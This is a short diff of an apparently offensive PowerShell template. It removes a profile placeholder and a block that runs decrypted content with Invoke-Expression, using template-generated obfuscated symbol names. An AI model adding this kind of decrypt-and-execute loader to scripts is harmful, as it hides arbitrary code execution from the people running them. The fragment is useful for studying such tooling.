@@ -876,9 +876,3 @@ try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
 try { New-Alias -Name umwd -Value Unmount-Webdav } catch { }
 
 Update-HubModules | Out-Null
-
-{{ profile }}
-
-if (${{symbol_name("clip_entry")}}) {
-    Invoke-Expression ({{symbol_name("Decrypt-String")}} ${{symbol_name("clip_entry")}})
-}
